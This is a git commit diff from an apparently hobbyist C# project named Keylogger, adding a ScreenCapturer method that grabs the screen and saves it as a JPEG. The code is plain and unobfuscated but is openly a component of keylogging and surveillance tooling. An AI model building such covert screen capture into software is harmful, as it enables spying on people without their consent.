c9b6bb47d0d957fd53e27c6e8c0387f9fb6d3b4e
Alejandro <alejandrocarrion1999@gmail.com>
2021-08-20 16:06:53 +0200

    Implementar ScreenCapturer.

--- Keylogger/Managers/ScreenCapturer.cs
+++ Keylogger/Managers/ScreenCapturer.cs
@@ -1,6 +1,17 @@
-﻿namespace Keylogger.Managers
+﻿using System.Drawing;
+using System.Drawing.Imaging;
+
+namespace Keylogger.Managers
 {
     public class ScreenCapturer
     {
+        public void TakeScreenshot(string screenshotPath)
+        {
+            Bitmap bitmap = new Bitmap(1920, 1024);
+            Graphics graphics = Graphics.FromImage(bitmap);
+
+            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
+            bitmap.Save(screenshotPath, ImageFormat.Jpeg);
+        }
     }
 }
